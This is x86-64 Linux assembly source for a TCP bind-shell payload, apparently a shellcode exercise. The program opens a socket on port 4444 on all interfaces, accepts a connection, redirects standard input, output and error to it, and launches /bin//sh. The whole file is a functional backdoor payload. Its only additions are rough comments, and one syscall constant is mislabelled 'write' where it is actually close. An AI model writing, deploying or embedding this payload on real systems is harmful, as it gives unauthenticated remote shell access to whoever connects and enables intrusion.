; =================================================
;   TCP Bind Shell
; =================================================

global _start

; Syscall numbers
syscalls.socket equ 0x29
syscalls.bind   equ 0x31
syscalls.listen equ 0x32
syscalls.accept equ 0x2b
syscalls.write  equ 0x03
syscalls.dup2   equ 0x21
syscalls.execve equ 0x3b

; Constant definitions
ipv4 equ 0x02 ; AF_INET
tcp equ 0x01 ; SOCK_STREAM

; Standard streams
standardIO.in   equ 0x00
standardIO.out  equ 0x01
standardIO.err  equ 0x02

;:> echo -n '//bin/sh' | rev | xxd
;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
binshString     equ 0x68732f6e69622f2f

; Configs
config.max_cons equ 0x2

_start:
    ; 1 - Create socket (socket syscall)
    ;   > man 2 socket
    ;   int socket(int domain, int type, int protocol);
    ;   domain can be AF_INET (ipv4) or AF_INET6 (ipv6)
    ;   type can be SOCK_STREAM (tcp) or SOCK_DGRAM (udp)
    ;   returns the socket file descriptorq
    ;   syscall number is 0x29
	mov rax, syscalls.socket
	mov rdi, ipv4
	mov rsi, tcp
	mov rdx, 0x00
	syscall

    ;;;; REVISIT THIS PART - BEGIN

	; not mine: copy socket descriptor to rdi for future use 
	mov rdi, rax

	; bzero(&server.sin_zero, 8)
	xor rax, rax 
	push rax

	; server.sin_addr.s_addr = INADDR_ANY
	mov dword [rsp-4], eax

    ; server.sin_port = htons(PORT)
	mov word [rsp-6], 0x5c11

    ; server.sin_family = AF_INET
	mov word [rsp-8], 0x2
	sub rsp, 8

	;;;; REVISIT THIS PART - END

    ; 3 - Bind to socket
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	mov rax, syscalls.bind
	mov rsi, rsp
	mov rdx, 16
	syscall

    ; 4 - Listen
	; listen(sock, MAX_CLIENTS)
	mov rax, syscalls.listen
	mov rsi, config.max_cons
	syscall

    ; 5 - Accept incoming connection
    ; REVISIT THIS
	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	mov rax, syscalls.accept
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall

    ; REVISIT THIS
	; store the client socket description 
	mov r9, rax 
        ; close parent
        mov rax, syscalls.write
        syscall

        ; 7 - Duplicate sockets
        ; REVISIT THIS : make a loop to shorten the payload?
        mov rdi, r9
        mov rax, syscalls.dup2
        mov rsi, standardIO.in
        syscall

        mov rax, syscalls.dup2
        mov rsi, standardIO.out
        syscall

        mov rax, syscalls.dup2
        mov rsi, standardIO.err
        syscall

        ; 7 - Execve for fun and profit!
        ; REVISIT THIS

        ; First NULL push
        xor rax, rax
        push rax
        ; push /bin//sh in reverse
        mov rbx, binshString
        push rbx
        ; store /bin//sh address in RDI
        mov rdi, rsp
        ; Second NULL push
        push rax
        ; set RDX
        mov rdx, rsp
        ; Push address of /bin//sh
        push rdi
        ; set RSI
        mov rsi, rsp
        mov rax, syscalls.execve
        syscall